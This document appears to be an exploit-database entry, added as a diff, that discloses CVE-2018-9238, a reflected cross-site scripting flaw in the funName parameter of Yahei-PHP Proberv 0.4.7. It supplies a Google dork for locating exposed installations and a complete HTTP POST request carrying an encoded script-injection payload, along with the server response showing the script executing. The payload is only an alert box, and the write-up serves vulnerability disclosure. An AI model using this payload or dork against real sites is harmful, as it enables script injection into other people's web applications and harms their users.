@@ -1,0 +1,66 @@
+# Exploit title: Yahei-PHP Proberv0.4.7 - Cross-Site Scripting
+# Google Dork: intitle:"Proberv0." | inurl:/proberv.php
+# Date: 23/03/2018
+# Exploit Author: ManhNho
+# Vendor Homepage: http://www.yahei.net/
+# Software Link: www.yahei.net/tz/tz_e.zip
+# Version: 0.4.7
+# CVE: CVE-2018-9238
+# Tested on: Windows 10 / Kali Linux
+# Category: Webapps
+
+
+#1. Description
+-----------------------------------------------------
+proberv.php in Yahei-PHP Proberv 0.4.7 has XSS via the funName parameter.
+
+
+#2. Proof of Concept
+-----------------------------------------------------
+Request:
+
+POST /proberv.php HTTP/1.1
+Host: <target>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101
+Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: <target>/proberv.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+pInt=No+Test&pFloat=No+Test&pIo=No+Test&host=localhost&port=3306&login=&password=&funName=%27%29%3C%2Fscript%3E%3Cscript%3Ealert%28%221%22%29%3B%3C%2Fscript%3E&act=Function+Test&mailAdd=
+
+-----------------------------------------------------
+Response:
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 22 Mar 2018 16:59:57 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Vary: Accept-Encoding
+Content-Length: 30461
+...
+<tr>
+<td width="15%"></td>
+<td width="60%">
+Enter the function you want to test:
+<input type="text" name="funName" size="50" />
+</td>
+<td width="25%">
+<input class="btn" type="submit" name="act" align="right" value="Function
+Test" />
+</td>
+</tr>
+<script>alert('Function')</script><script>alert("1");</script>Test results
+support the position: 错误')</script></table>
+
+
+#3. References
+-----------------------------------------------------
+https://pastebin.com/ia7U4vi9
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9238
